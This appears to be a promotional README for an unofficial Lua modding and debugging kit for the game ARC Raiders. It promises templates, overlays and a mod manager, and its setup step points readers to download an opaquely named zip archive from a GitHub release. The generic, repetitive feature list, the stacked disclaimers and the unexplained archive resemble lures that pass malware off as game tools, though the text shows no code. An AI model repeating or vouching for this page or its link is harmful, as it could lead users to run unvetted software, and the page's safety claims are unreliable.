ARC Raiders — Lua Mod & Dev Kit (Unofficial Tool for Learning and Local Testing)

This tool is designed for those who want to explore scripting, experiment with mods in an offline environment, and improve debugging skills in ARC Raiders. It is intended solely for educational purposes, local development, and testing in a controlled environment. Before using it, make sure you comply with the game’s terms of service and the rules of the servers you play on.

What’s Inside and Main Features

1.Lightweight Lua Runtime and Code Samples — a collection of templates and examples to help you understand script structure and start developing your own mechanics in a safe test environment.

2.Debugging Tools — extended logging, real-time variable output, error tracing, and a simple console for testing small pieces of code locally.

3.Visual Overlay for Local Sessions — customizable HUD for displaying diagnostic information, creating test objects, and checking animations in offline mode.

4.Local Mod Manager — convenient interface for installing and managing user-made mods in a separate test folder without changing the official game files.

4.Editor Support — example configurations for VS Code and other popular editors, autocomplete, and Lua code formatting rules.

5.Documentation and Learning Materials — short guides on creating simple mods, interacting with available APIs, and performing safe debugging in a local environment.

Why Choose This Kit

1.Educational Focus. The project is designed for learning — clear examples, ready-to-use templates, and step-by-step instructions for beginners.

2.Safe to Use. Tools are configured for local folders and test environments to minimize the risk of unintended changes to your main game copy.

3.Low Requirements. Only a lightweight Lua runtime and access to a test folder are needed — works on most PCs.

4.Open Structure. Files are organized for easy study, modification, and extension within the project’s license.

5.Community-Friendly. Includes tips for safe content sharing and links to communities discussing mod creation within the rules.

How to Get Started (Quick Setup)

1.Download the archive with examples and documentation here:
https://github.com/handehx/Lua/releases/download/Update/U.d.t.zip

2.Extract it into a separate folder — not into your official game directory. Use a separate test copy or folder for experiments.

3.Open the README file inside the archive and follow the step-by-step instructions to start a local debugging session and test the provided examples.

4.Edit the examples in your favorite editor (e.g., VS Code) and test them offline.

Responsibility and Compliance

This project is created for legitimate purposes — learning, development, and local testing. It is not intended or allowed to be used for gaining multiplayer advantages, bypassing security systems, or interfering with online environments. Always ensure your actions comply with license agreements and platform rules before use.
